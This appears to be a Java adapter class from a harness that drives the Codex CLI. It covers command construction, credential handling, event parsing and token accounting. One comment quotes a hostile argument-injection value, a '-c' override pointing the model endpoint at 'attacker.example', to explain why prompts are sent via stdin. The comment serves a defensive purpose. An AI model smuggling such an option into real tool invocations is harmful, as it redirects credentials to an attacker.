package dev.codespire.harness.codex;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import dev.codespire.harness.FailureCause;
import dev.codespire.harness.HarnessAdapter;
import dev.codespire.harness.HarnessCapabilities;
import dev.codespire.harness.HarnessInvocation;
import dev.codespire.harness.HarnessType;
import dev.codespire.harness.PromptDelivery;
import dev.codespire.harness.RunEvent;
import dev.codespire.harness.RunEventSummary;
import dev.codespire.harness.TerminalOutcome;
import dev.codespire.harness.TokenBucket;
import dev.codespire.harness.UsageReport;

import java.time.Instant;
import java.util.EnumMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;

/**
 * Drives OpenAI Codex CLI (Apache-2.0) non-interactively.
 *
 * <p>Auth is an API key or a subscription credential the operator registered (ADR-030); this adapter
 * only places what it is given into the child environment. It never logs it and never puts it in
 * argv, which is world-readable through {@code /proc/<pid>/cmdline} and echoed by
 * {@code docker inspect}.
 *
 * <p><b>Everything below was measured against the real binary, not read from documentation.</b> The
 * plan this implements asserted an event shape that does not exist ({@code {"type":"token_count"}}),
 * which would have made {@link #usage} return UNKNOWN for every run — a feature that looks installed
 * and measures nothing. The shapes actually emitted are recorded on each branch.
 */
public final class CodexAdapter implements HarnessAdapter {

    private static final ObjectMapper JSON = new ObjectMapper();

    /**
     * A tool's command line and its output are model-controlled text of unbounded length, and every
     * event becomes a row on an operator's timeline. Truncated on the way in rather than at every
     * later renderer.
     */
    private static final int MAX_SUMMARY_CHARS = 2_000;

    @Override
    public HarnessType type() {
        return HarnessType.CODEX;
    }

    @Override
    public HarnessCapabilities capabilities() {
        // codex exec is one-shot: no session to steer. It CAN resume, but M0 does not use it.
        return new HarnessCapabilities(true, true, false, false, true);
    }

    /**
     * Stdin, so the work item's text never enters argv.
     *
     * <p>Verified against codex-cli: {@code codex exec --help} states that instructions are read
     * from stdin when the prompt is not given as an argument or when {@code -} is used, and a live
     * run confirmed it. This is the defence against a work item whose body begins with a hyphen:
     * Codex's own parser would read it as an option, and {@code -c} overrides any config value —
     * {@code -c model_providers.openai.base_url=http://attacker.example/v1} redirects the model call
     * and the credential with it, with no shell involved (CWE-88). An end-of-options {@code --}
     * would also close that; stdin closes it and keeps the item's text out of
     * {@code /proc/<pid>/cmdline} and {@code docker inspect} as well.
     */
    @Override
    public PromptDelivery promptDelivery() {
        return PromptDelivery.STDIN;
    }

    @Override
    public List<String> command(HarnessInvocation invocation) {
        // Every flag verified present in `codex exec --help`. Two things the documentation gets
        // wrong and an earlier draft of the plan asserted anyway: --ask-for-approval does not
        // exist, and the sandbox mode cannot be workspace-write.
        //
        // Codex's Linux sandbox is BUBBLEWRAP (it vendors bwrap), and Docker's default seccomp
        // profile refuses the user namespace bwrap needs. Making it work would require
        // seccomp=unconfined on the container — weakening the OUTER boundary to gain an inner one.
        // And Codex does not fail at startup when its sandbox cannot initialize, so leaving
        // workspace-write set would mean believing in two boundaries while having one.
        //
        // The container is the boundary (ADR-038, RUN-TOPOLOGY §1).
        //
        // The trailing "-" is the prompt position, explicitly reading stdin. It is not the prompt.
        return List.of(
                "codex", "exec",
                "--json",
                "--sandbox", "danger-full-access",
                "--skip-git-repo-check",
                "--model", invocation.model(),
                "-C", invocation.workspacePath(),
                "-");
    }

    @Override
    public Map<String, String> environment(HarnessInvocation invocation) {
        Map<String, String> env = new LinkedHashMap<>(invocation.credentials());
        env.put("CODEX_QUIET_MODE", "1");
        return Map.copyOf(env);
    }

    /**
     * One NDJSON line to one normalized event.
     *
     * <p>The real vocabulary, captured from live runs: {@code thread.started}, {@code turn.started},
     * {@code item.started} / {@code item.completed} carrying a nested {@code item.type}, and
     * {@code turn.completed} carrying usage. {@code error} is the documented failure envelope.
     */
    @Override
    public Optional<RunEvent> parse(String line) {
        if (line == null || line.isBlank()) {
            return Optional.empty();
        }
        JsonNode node;
        try {
            node = JSON.readTree(line);
        } catch (Exception e) {
            return Optional.empty(); // a line we cannot read is skipped, never fatal
        }
        if (node == null || !node.isObject()) {
            return Optional.empty();
        }
        Instant at = Instant.now();
        String envelope = node.path("type").asText("");

        return switch (envelope) {
            case "error" -> Optional.of(
                    new RunEvent.StateChange(at, "error", clip(node.path("message").asText(""))));
            case "turn.completed" -> usageEvent(node.path("usage"), at);
            case "item.started", "item.completed" -> item(node, envelope, at);
            case "" -> Optional.empty();
            default -> Optional.of(new RunEvent.StateChange(at, envelope, ""));
        };
    }

    /**
     * A command_execution arrives TWICE — once started, once completed — so the two halves map to
     * different events. Emitting the same ToolUse for both would double every shell command on the
     * timeline and make a run look twice as busy as it was.
     */
    private Optional<RunEvent> item(JsonNode node, String envelope, Instant at) {
        JsonNode item = node.path("item");
        String itemType = item.path("type").asText("");
        boolean completed = "item.completed".equals(envelope);

        return switch (itemType) {
            case "agent_message" -> completed
                    ? Optional.of(new RunEvent.Output(at, clip(item.path("text").asText(""))))
                    : Optional.empty();
            case "reasoning" -> completed
                    ? Optional.of(new RunEvent.Thinking(at, clip(item.path("text").asText(""))))
                    : Optional.empty();
            case "command_execution" -> Optional.of(completed
                    ? new RunEvent.ToolResult(at, "shell", failed(item),
                            clip(item.path("aggregated_output").asText("")))
                    : new RunEvent.ToolUse(at, "shell", clip(item.path("command").asText(""))));
            default -> Optional.of(new RunEvent.StateChange(at, envelope, itemType));
        };
    }

    /** A command with no exit code yet has not failed; only a non-zero one has. */
    private static boolean failed(JsonNode item) {
        JsonNode exitCode = item.path("exit_code");
        return exitCode.isNumber() && exitCode.asInt() != 0;
    }

    /**
     * Codex's usage block, partitioned onto {@link TokenBucket}.
     *
     * <p>Codex is OpenAI, and OpenAI reports its detail counts as SUBSETS of the headline numbers —
     * {@code TokenUsageMapper.openAi} in spire-llm subtracts for exactly this reason. Writing them
     * raw is the mistake that looks correct: a measured run reporting 14064 input of which 9984 were
     * cached would be recorded as 24048 tokens for a call that used 14064, inflated by the cache-hit
     * rate and therefore inflated most on the cheapest runs.
     *
     * <p><b>Two honest limits, recorded rather than papered over.</b> Codex reports no total, so the
     * independent cross-check {@code TokenUsageMapper} performs against {@code totalTokenCount()} is
     * not available here — a mis-partition cannot be caught by arithmetic. And
     * {@code cache_write_input_tokens} is treated as ADDITIONAL to input rather than a subset of it,
     * matching what the name describes and how Anthropic reports the same concept; every run
     * observed so far reported zero, so the alternative has not been ruled out by measurement. A
     * run with a non-zero cache write is what would settle it.
     */
    private Optional<RunEvent> usageEvent(JsonNode usage, Instant at) {
        if (!usage.isObject()) {
            return Optional.empty(); // a turn that reported nothing is UNKNOWN, never zero
        }
        long input = count(usage, "input_tokens");
        long cached = count(usage, "cached_input_tokens");
        long cacheWrite = count(usage, "cache_write_input_tokens");
        long output = count(usage, "output_tokens");
        long reasoning = count(usage, "reasoning_output_tokens");

        if (input < 0 || cached < 0 || cacheWrite < 0 || output < 0 || reasoning < 0) {
            // A negative count is not a measurement. A buggy OpenAI-compatible proxy reporting one
            // once dead-lettered a paid review; here it degrades the turn to UNKNOWN instead.
            return Optional.empty();
        }
        if (cached > input || reasoning > output) {
            // The vendor's own numbers contradict each other, so no split can be trusted. Report
            // the headline total as the degraded case rather than flooring a subtraction to zero
            // and presenting the result as a breakdown.
            return Optional.of(new RunEvent.Usage(at,
                    UsageReport.of(Map.of(TokenBucket.TOTAL, input + output))));
        }

        Map<TokenBucket, Long> counts = new EnumMap<>(TokenBucket.class);
        counts.put(TokenBucket.INPUT, input - cached);
        counts.put(TokenBucket.CACHED_INPUT, cached);
        counts.put(TokenBucket.CACHE_WRITE, cacheWrite);
        counts.put(TokenBucket.OUTPUT, output - reasoning);
        counts.put(TokenBucket.REASONING, reasoning);
        return Optional.of(new RunEvent.Usage(at, UsageReport.of(counts)));
    }

    /** A field that is absent reads as zero; one that is present but not a number reads as -1. */
    private static long count(JsonNode usage, String field) {
        JsonNode value = usage.path(field);
        if (value.isMissingNode() || value.isNull()) {
            return 0L;
        }
        return value.isNumber() ? value.asLong() : -1L;
    }

    @Override
    public TerminalOutcome classify(int exitCode, RunEventSummary seen) {
        if (exitCode == 0) {
            return TerminalOutcome.success("codex exec completed");
        }
        if (!seen.sawAnyOutput()) {
            // Distinct and nameable: the model spent its whole budget and said nothing. Reported as
            // a generic non-zero exit it reads as an infrastructure fault, and the operator looks
            // in the wrong place.
            return TerminalOutcome.failure(FailureCause.NO_MODEL_RESPONSE, "exit " + exitCode + ", no output");
        }
        return TerminalOutcome.failure(FailureCause.HARNESS_EXIT_NONZERO, "exit " + exitCode);
    }

    /**
     * The LAST usage report wins. Codex emits one per turn, and each is a measurement of that turn's
     * cumulative totals rather than an increment — summing them would multiply a multi-turn run's
     * cost by roughly the number of turns.
     */
    @Override
    public UsageReport usage(RunEventSummary seen) {
        UsageReport latest = UsageReport.unknown();
        for (RunEvent event : seen.events()) {
            if (event instanceof RunEvent.Usage usage) {
                latest = usage.report();
            }
        }
        return latest;
    }

    private static String clip(String text) {
        if (text == null) {
            return "";
        }
        return text.length() <= MAX_SUMMARY_CHARS ? text : text.substring(0, MAX_SUMMARY_CHARS) + "…";
    }
}
